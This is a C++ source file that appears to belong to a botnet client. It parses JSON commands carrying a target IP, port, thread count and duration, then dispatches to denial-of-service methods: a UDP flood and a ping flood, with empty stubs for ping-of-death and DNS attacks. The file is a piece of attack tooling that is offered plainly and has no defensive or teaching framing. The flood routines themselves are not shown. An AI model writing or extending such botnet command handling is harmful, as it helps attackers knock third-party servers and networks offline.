#include "headersProcessing.h"


processingRequests::processingRequests(std::string jsonString) {
	this->jsonString = jsonString;
}


void processingRequests::transmissionRequests() {
    try {
        nlohmann::json j = nlohmann::json::parse(jsonString);
        manageBotnet BotnetManager(j["port"], j["ip"], j["method"], j["thread"], j["time"]);
        methodAttack methodUsage;

        if (j["method"] == methodUsage.UDP) {
            BotnetManager.udpSpam();
        }
        else if(j["method"] == methodUsage.PING){
            BotnetManager.pingUser();
        }

        else if(j["method"] == methodUsage.POD) {

        }

        else if (j["method"] == methodUsage.DNS) {

        }

        else {
            errorNotStop("error 402", "bad method");
        }
    }
    catch (const nlohmann::json::parse_error& e) {
        errorNotStop("error 401", "invalid JSON");
    }
}